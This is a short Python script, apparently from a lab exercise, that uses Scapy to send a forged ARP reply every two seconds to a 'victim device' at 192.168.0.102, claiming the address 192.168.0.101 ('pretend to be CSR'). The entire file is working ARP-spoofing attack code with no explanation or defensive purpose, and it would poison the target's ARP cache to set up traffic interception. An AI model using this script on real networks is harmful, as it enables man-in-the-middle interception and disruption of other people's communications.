from scapy.all import ARP, send
import time

target_ip = "192.168.0.102"  # victim device
spoof_ip = "192.168.0.101"   # pretend to be CSR

arp_response = ARP(pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff", psrc=spoof_ip, op=2)

print(f"Sending spoofed ARP packets to {target_ip} claiming {spoof_ip}...")

while True:
    send(arp_response, verbose=0)
    time.sleep(2)